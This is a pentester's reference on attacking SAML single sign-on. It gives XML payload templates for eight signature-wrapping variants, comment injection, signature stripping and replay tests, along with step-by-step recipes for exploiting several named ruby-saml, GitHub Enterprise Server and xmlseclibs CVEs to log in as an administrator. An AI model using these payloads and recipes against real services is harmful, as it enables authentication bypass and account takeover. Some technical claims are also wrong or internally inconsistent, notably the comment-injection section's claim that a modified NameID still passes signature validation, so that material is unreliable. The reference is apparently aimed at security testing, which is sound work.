# SAML Attacks — Deep Reference

## Table of Contents
1. Understanding SAML Flow
2. Signature Wrapping (XSW)
3. XML Comment Injection
4. Signature Stripping
5. Replay Attacks
6. SAML Response Manipulation
7. Tools and Setup
8. 2024–2025 SAML CVEs (Parser Differential Attacks)

---

## 1. Understanding SAML Flow

SAML authentication involves three parties:
- **IdP (Identity Provider):** Issues SAML assertions (Okta, Azure AD, ADFS, OneLogin)
- **SP (Service Provider):** The target app that trusts the IdP
- **Browser:** Carries SAML assertions between them (POST binding)

**Typical flow:**
1. User hits SP → SP sends `SAMLRequest` → IdP login page
2. User authenticates at IdP → IdP sends `SAMLResponse` back to SP
3. SP validates the response, creates a session

**What you're attacking:** The validation step (3). The SP trusts the IdP's signature, but validation is often flawed.

**Find SAML in the wild:**
- Look for `SAMLRequest` or `SAMLResponse` parameters (base64 encoded)
- XML POST to paths like `/saml/callback`, `/sso/saml`, `/auth/saml`
- Responses contain `<samlp:Response>` or `<saml:Assertion>` XML

**Decode SAML:**
```bash
# SAMLResponse is base64 + sometimes deflate compressed
echo "<SAMLResponse>" | base64 -d | xmllint --format -

# If compressed (SAMLRequest often is):
echo "<SAMLRequest>" | base64 -d | python3 -c "import sys,zlib; print(zlib.decompress(sys.stdin.buffer.read(), -15).decode())"
```

---

## 2. Signature Wrapping (XSW) Attacks

**The core idea:** SAML responses contain a `ds:Signature` that signs specific XML elements. The signature covers the *element with the matching ID*, but the parser may read a *different element* — one you injected without a signature.

The attack works because XML has two operations that can be tricked:
- Signature validation: validates the signed element (your original, untouched)
- Assertion parsing: reads the element the parser finds first (your injected one)

**XSW Variants (8 classic variants):**

### XSW1 — Clone and inject before
Add a copy of the signed `<Response>` before the original, with modified claims:
```xml
<samlp:Response>
  <!-- INJECTED: no signature -->
  <saml:Assertion>
    <saml:NameID>admin@company.com</saml:NameID>
  </saml:Assertion>

  <!-- ORIGINAL: signature intact -->
  <saml:Assertion ID="original">
    <saml:NameID>attacker@evil.com</saml:NameID>
    <ds:Signature>...signs ID="original"...</ds:Signature>
  </saml:Assertion>
</samlp:Response>
```
Parser reads first assertion → admin. Signature validates → original assertion passes.

### XSW2 — Inject into extensions
```xml
<samlp:Response>
  <samlp:Extensions>
    <!-- Your malicious assertion here, no signature needed -->
    <saml:Assertion>
      <saml:NameID>admin@company.com</saml:NameID>
    </saml:Assertion>
  </samlp:Extensions>
  <!-- original signed assertion -->
</samlp:Response>
```

### XSW3 — Wrap the signature
Move the signature element outside the assertion it covers, then inject:
```xml
<saml:Assertion>  <!-- unsigned copy with evil claims -->
  <saml:NameID>admin</saml:NameID>
</saml:Assertion>
<saml:Assertion ID="original">  <!-- signed original -->
  <saml:NameID>attacker</saml:NameID>
  <ds:Signature>  <!-- removed from assertion, placed outside -->
    <ds:Reference URI="#original"/>
  </ds:Signature>
</saml:Assertion>
```

### XSW4 — Evil clone inside signed element
Place a malicious assertion *inside* the signed Response element, before the signed Assertion:
```xml
<samlp:Response ID="response1">
  <saml:Assertion>              <!-- Evil: no signature, parsed first -->
    <saml:NameID>admin</saml:NameID>
  </saml:Assertion>
  <saml:Assertion ID="original"> <!-- Signed original -->
    <saml:NameID>attacker</saml:NameID>
    <ds:Signature><ds:Reference URI="#original"/></ds:Signature>
  </saml:Assertion>
  <ds:Signature><ds:Reference URI="#response1"/></ds:Signature>
</samlp:Response>
```
The outer Response signature validates. The inner evil Assertion has no signature but is parsed first.

### XSW5 — Signature references a cloned element
Copy the signed assertion, modify it, keep the original signature pointing at original ID:
```xml
<samlp:Response>
  <saml:Assertion ID="evil-clone">  <!-- Modified clone, different ID -->
    <saml:NameID>admin</saml:NameID>
    <!-- No signature on this one -->
  </saml:Assertion>
  <saml:Assertion ID="original">    <!-- Original, signature intact -->
    <saml:NameID>attacker</saml:NameID>
    <ds:Signature><ds:Reference URI="#original"/></ds:Signature>
  </saml:Assertion>
</samlp:Response>
```
If the SP uses the first Assertion regardless of which one is signed → evil-clone wins.

### XSW6 — Evil assertion wraps the signature
Put your evil assertion *around* the signature element:
```xml
<samlp:Response>
  <saml:Assertion ID="evil">         <!-- Outer evil assertion -->
    <saml:NameID>admin</saml:NameID>
    <saml:Assertion ID="original">   <!-- Signed original nested inside -->
      <saml:NameID>attacker</saml:NameID>
      <ds:Signature><ds:Reference URI="#original"/></ds:Signature>
    </saml:Assertion>
  </saml:Assertion>
</samlp:Response>
```
Signature validator finds and validates the inner element. Parser reads the outer element.

### XSW7 — Extensions carry the evil assertion
```xml
<samlp:Response>
  <saml:Assertion ID="original">
    <saml:NameID>attacker</saml:NameID>
    <saml:Advice>
      <saml:Assertion>              <!-- Evil in Advice/Extensions -->
        <saml:NameID>admin</saml:NameID>
      </saml:Assertion>
    </saml:Advice>
    <ds:Signature><ds:Reference URI="#original"/></ds:Signature>
  </saml:Assertion>
</samlp:Response>
```
Some parsers process nested Assertions found in `<saml:Advice>` — less common but worth trying.

### XSW8 — Comment-separated namespace confusion
Exploits namespace prefix handling differences between the XML signature validator and the application parser:
```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Assertion ID="evil" xmlns:saml="EVIL-NAMESPACE">
    <saml:NameID>admin</saml:NameID>  <!-- in evil namespace -->
  </saml:Assertion>
  <saml:Assertion ID="original">
    <saml:NameID>attacker</saml:NameID>
    <ds:Signature><ds:Reference URI="#original"/></ds:Signature>
  </saml:Assertion>
</samlp:Response>
```
The signature validator ignores the evil-namespace Assertion. Some SPs parse both.

### Practical approach:
Use **SAMLReQuest** or **SAML Raider** (Burp extension) which automates all 8 XSW variants.

**Test methodology:**
1. Capture a valid SAMLResponse in Burp
2. Send to SAML Raider
3. Try XSW variants 1-8 with your target username modified to admin or another user's email
4. Submit each to the SP — check which sessions are created

---

## 3. XML Comment Injection

**The idea:** XML comments (`<!-- -->`) are ignored by the XML parser but the *text content* of a node with comments may be handled differently by different processors.

**Attack:**
```xml
<!-- Original -->
<saml:NameID>attacker@evil.com</saml:NameID>

<!-- Modified — signature covers this exact string -->
<saml:NameID>attacker<!---->@evil.com</saml:NameID>

<!-- Some parsers strip comments and read: attacker@evil.com -->
<!-- Others read the full string with comments -->
```

**More impactful version:**
```xml
<!-- Original: user@company.com -->
<saml:NameID>user@company.com</saml:NameID>

<!-- If we can inject a comment to change who the assertion is for: -->
<saml:NameID>admin<!--user-->@company.com</saml:NameID>
```
*Note: Signature still validates because the bytes are the same*

**Where this works:** Ruby's REXML parser, some PHP SAML libraries, older Java implementations.

---

## 4. Signature Stripping

Some SAML SP implementations don't properly require a signature — they only *validate* a signature *if one is present*.

**Test:**
1. Capture a valid SAMLResponse
2. Remove the entire `<ds:Signature>` element
3. Change `<saml:NameID>` to a target user (admin)
4. Re-encode and submit

If the SP accepts an unsigned assertion → complete authentication bypass for any user.

**Also test:**
- Keep the signature element but corrupt the signature value — is it rejected?
- Remove just the `<ds:Reference>` from within the signature
- Change `<saml:Assertion>` to not have `ID` attribute — does the reference break validation?

---

## 5. Replay Attacks

SAML responses contain timestamps to prevent replay. But these are often misconfigured.

**Key timing elements:**
```xml
<saml:Conditions
  NotBefore="2024-01-01T10:00:00Z"
  NotOnOrAfter="2024-01-01T10:05:00Z">

<saml:SubjectConfirmationData
  NotOnOrAfter="2024-01-01T10:05:00Z"
  Recipient="https://sp.com/saml/callback"
  InResponseTo="id12345">
```

**Replay tests:**
- Submit the same SAMLResponse twice — is the ID tracked and rejected?
- Submit a SAMLResponse with `NotOnOrAfter` in the past — is the timestamp checked?
- Remove `NotOnOrAfter` entirely — is it required?
- Change the `Recipient` to a different SP endpoint — is it validated?
- Remove `InResponseTo` — is the SP-initiated flow enforced?

---

## 6. SAML Response Manipulation

### Assertion vs Response Signing
Some implementations sign only the outer `<samlp:Response>` but not the inner `<saml:Assertion>`. If only the response is signed, you can freely modify assertion contents:

```xml
<samlp:Response> <!-- signed -->
  <saml:Assertion> <!-- NOT signed — modify freely -->
    <saml:NameID>admin@company.com</saml:NameID>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <ds:Signature>...signs the Response element...</ds:Signature>
</samlp:Response>
```

### Attribute Injection
SAML assertions often carry attributes used for authorization (`role`, `groups`, `admin`, `email`). If you can modify attributes without breaking the signature:
- Change `role` from `user` to `admin`
- Add `groups` attribute with admin groups
- Change `email` to another user's email

### Recipient / AudienceRestriction Bypass
```xml
<saml:AudienceRestriction>
  <saml:Audience>https://sp.company.com</saml:Audience>
</saml:AudienceRestriction>
```
Try: empty audience, wrong URL, remove element entirely.

---

## 7. Tools and Setup

### Burp Extensions
- **SAML Raider:** Automates XSW attacks, allows easy modification and re-signing
  - Install from BApp Store
  - Sends SAMLResponse to SAML Raider tab
  - Tries all XSW variants automatically

- **SAML Editor:** Simple SAML decode/encode in Burp

### Command Line
```bash
# Decode SAMLResponse
python3 -c "
import base64, sys
data = sys.argv[1]
decoded = base64.b64decode(data)
print(decoded.decode())
" "<SAMLResponse_value>"

# Re-encode after modification
python3 -c "
import base64
with open('modified.xml','rb') as f:
    print(base64.b64encode(f.read()).decode())
"

# xmllint for formatting
echo "<saml>" | xmllint --format -
```

---

## 8. 2024–2025 SAML CVEs (Parser Differential Attacks)

These are the most significant SAML attack class discovered since XSW. **All you need is one valid SAML response for any account (including your own test account).**

### CVE-2024-45409 — ruby-saml XPath `//` Selector Bypass (CVSS 10.0)
**Affected:** ruby-saml ≤ 1.16.0, GitLab CE/EE < 17.3.3 | **Patched:** ruby-saml 1.17.0

**What it is:** ruby-saml used `//` XPath notation to locate signature elements — this matches elements anywhere in the document. An attacker inserts a forged `DigestValue` inside `samlp:Extensions`. The XPath selector finds the forged element first, validates it, and the modified assertion content passes with a valid signature.

**Attack:**
```
1. Obtain any valid SAMLResponse for any account (even your own)
2. Craft modified response:
   - Keep original <ds:SignedInfo> and <ds:SignatureValue> intact
   - Add: <samlp:Extensions><ds:DigestValue>FORGED_VALUE</ds:DigestValue></samlp:Extensions>
   - Replace <saml:NameID> with target's email/username (e.g., admin@company.com)
3. POST to ACS endpoint
4. ruby-saml finds forged DigestValue via // XPath — validates it — grants admin access
```

**PoC:** github.com/synacktiv/CVE-2024-45409

**Check versions:** `bundle exec gem list | grep ruby-saml`; GitLab Admin Area → System Info → show gitlab.rb

---

### CVE-2025-25291 + CVE-2025-25292 — Parser Differential (GitHub Security Lab)
**Affected:** ruby-saml ≤ 1.17.0, GitLab (all editions) | **Patched:** ruby-saml 1.18.0
**Researcher:** GitHub Security Lab (GHSL-2024-329/330), March 2025

**What it is:** ruby-saml uses two XML parsers internally:
- **REXML** — for signature verification
- **Nokogiri** — for assertion extraction (NameID reading)

These parsers generate different DOM trees from the same XML input, enabling a crafted document to pass signature verification over one set of elements while reading assertion data from a completely different set.

**CVE-2025-25291 — DOCTYPE entity split:**
```xml
<!DOCTYPE foo [<!ENTITY xxe "injected_nameid">]>
<!-- REXML validates signature over entity reference version -->
<!-- Nokogiri expands entity and reads different NameID value -->
```

**CVE-2025-25292 — Namespace prefix handling split:**
```xml
<!-- Prefixed namespace declarations handled differently -->
<!-- REXML matches different elements than Nokogiri for the same XPath query -->
```

**Attack:** One valid SAMLResponse from your own account → log in as any other user (admin). No key material needed.

**PoC:** Available via GitHub Security Lab advisory GHSL-2024-329

---

### CVE-2024-4985 — GHES Encrypted Assertion Signature Skip (CVSS 10.0)
**Affected:** GitHub Enterprise Server < 3.13.3

**What it is:** When SAML responses used encrypted assertions, GHES skipped signature verification on the outer `samlp:Response` element. An attacker sends an unsigned Response with a self-crafted (encrypted) assertion.

**Attack:**
```
1. Set up an IdP that produces encrypted assertions (even a self-hosted SimpleSAMLphp)
2. Configure GHES to use your IdP
3. Craft an assertion for any user (site admin)
4. Encrypt it with the SP's certificate (public — usually downloadable)
5. Wrap in unsigned samlp:Response
6. Submit to GHES ACS endpoint → authenticated as site admin
```

---

### "The Fragile Lock" — Canonicalization Desync (Black Hat EU 2025)
**Researcher:** Zakhar Fedotkin (PortSwigger) | **CVEs:** CVE-2025-66568, CVE-2025-66567
**Affected:** ruby-saml 1.12.4, php-saml, xmlseclibs (PHP) < 3.1.4

**What it is:** Both ruby-saml and php-saml rely on libxml2 for XML canonicalization (C14N). The document libxml2 canonicalizes for signature verification differs from the document the XML parser reads for assertion extraction, due to libxml2 handling of:
- Namespace inheritance
- Comment node stripping
- Attribute ordering in edge cases

**Result:** Signature is verified over `<saml:NameID>victim@corp.com</saml:NameID>`, but the assertion is parsed as `<saml:NameID>attacker@evil.com</saml:NameID>`.

**Testing:**
1. Use PortSwigger's public toolkit (linked from their research page)
2. Submit crafted SAMLResponse with carefully constructed namespace/comment XML
3. Observe whether the authenticated username differs from the NameID you signed over

**Affected widely:** xmlseclibs is used in hundreds of PHP SAML implementations beyond ruby-saml. Any PHP app using xmlseclibs < 3.1.4 may be vulnerable.

### SAMLTool
```bash
# Online: https://www.samltool.com/decode.php
# Handles both regular and deflated SAML
```

### Testing Checklist
```
[ ] Signature present and required
[ ] Signature covers the assertion (not just outer response)
[ ] Unsigned assertions rejected
[ ] XSW variants 1-8 tested
[ ] XML comment injection tested
[ ] Replay: duplicate submission rejected
[ ] Replay: expired NotOnOrAfter rejected
[ ] Recipient URL validated
[ ] InResponseTo validated (SP-initiated only)
[ ] AudienceRestriction enforced
[ ] Attribute values not injectable
[ ] IdP metadata not fetched from attacker-controlled URL
```
